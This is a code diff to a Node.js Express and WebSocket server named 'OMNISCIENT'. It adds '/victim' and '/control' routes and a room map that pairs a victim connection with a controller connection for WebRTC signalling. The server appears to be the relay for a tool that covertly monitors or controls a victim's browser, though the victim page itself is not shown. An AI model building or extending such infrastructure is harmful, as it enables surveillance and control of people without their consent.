@@ -7,9 +7,24 @@ const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
+// ----- ROUTES (clean URLs) -----
+app.get('/', (req, res) => {
+    res.send('OMNISCIENT is live. Use /victim for the victim page, /control for the control panel.');
+});
+
+app.get('/victim', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'victim.html'));
+});
+
+app.get('/control', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'control.html'));
+});
+
+// ----- STATIC FILES (fallback for assets) -----
 app.use(express.static(path.join(__dirname, 'public')));
 
-const rooms = new Map();
+// ----- WEBSOCKET ROOM MANAGEMENT -----
+const rooms = new Map(); // roomId -> { victimWs, controllerWs, victimOffer, controllerAnswer }
 
 wss.on('connection', (ws) => {
     let roomId = null;
@@ -123,6 +138,7 @@ wss.on('connection', (ws) => {
             const room = rooms.get(roomId);
             if (room.victimWs === ws) room.victimWs = null;
             if (room.controllerWs === ws) room.controllerWs = null;
+            // Clean up if both are gone
             if (!room.victimWs && !room.controllerWs) {
                 rooms.delete(roomId);
             }
